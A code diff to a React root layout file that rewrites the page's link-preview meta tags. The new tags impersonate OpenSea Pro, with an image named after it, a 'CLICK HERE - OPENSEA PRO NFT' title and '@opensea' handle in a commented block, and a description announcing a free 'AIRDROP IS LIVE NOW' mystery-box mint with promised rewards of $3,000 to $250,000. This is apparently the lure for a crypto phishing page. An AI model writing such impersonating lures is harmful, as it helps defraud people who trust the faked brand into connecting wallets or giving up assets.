@@ -14,21 +14,21 @@ function RootLayout({ children }: { children: React.ReactNode }) {
           property="og:site_name"
           content="This is an automatically generated announcement message"
         />
-        {/* <meta
-            property="og:description"
-            content="🟢 AIRDROP IS LIVE NOW 🟢 &#10;&#10;•🎉 Price: FREE 🎉 &#10;•🎉 Supply: 150 Mystery Box 🎉 &#10;•🎉 Reward: between $3,000 and $250,000 &#10;&#10;•TRY YOUR LUCK! 🚀&#10;&#10;Minting has officially Begun Early 🏆🏆&#10;&#10;We have formally decided as a team to allow individuals to mint today 🚀🎊 Instead of whitelists, we're rewarding active users with early access! 🎁"
-          /> */}
-        <meta property="og:image" content="/images/Untitled.png" />
+        <meta
+          property="og:description"
+          content="🟢 AIRDROP IS LIVE NOW 🟢 \n;•🎉 Price: FREE 🎉 &#10;"
+        />
+        <meta property="og:image" content="/images/Opensea-Pro-NFT.png" />
         <meta name="theme-color" content="#7289DA" />
 
         {/* Twitter Meta Tags */}
-        <meta name="twitter:card" content="summary_large_image" />
+        {/* <meta name="twitter:card" content="summary_large_image" />
         <meta name="twitter:site" content="@opensea" />
         <meta name="twitter:title" content="CLICK HERE - OPENSEA PRO NFT" />
-        {/* <meta
-            property="og:description"
-            content="🟢 AIRDROP IS LIVE NOW 🟢 &#10;&#10;•🎉 Price: FREE 🎉 &#10;•🎉 Supply: 150 Mystery Box 🎉 &#10;•🎉 Reward: between $3,000 and $250,000 &#10;&#10;•TRY YOUR LUCK! 🚀&#10;&#10;Minting has officially Begun Early 🏆🏆&#10;&#10;We have formally decided as a team to allow individuals to mint today 🚀🎊 Instead of whitelists, we're rewarding active users with early access! 🎁"
-          /> */}
+        <meta
+          property="og:description"
+          content="🟢 AIRDROP IS LIVE NOW 🟢 &#10;&#10;•🎉 Price: FREE 🎉 &#10;•🎉 Supply: 150 Mystery Box 🎉 &#10;•🎉 Reward: between $3,000 and $250,000 &#10;&#10;•TRY YOUR LUCK! 🚀&#10;&#10;Minting has officially Begun Early 🏆🏆&#10;&#10;We have formally decided as a team to allow individuals to mint today 🚀🎊 Instead of whitelists, we're rewarding active users with early access! 🎁"
+        /> */}
 
         {/* Icons */}
         <link
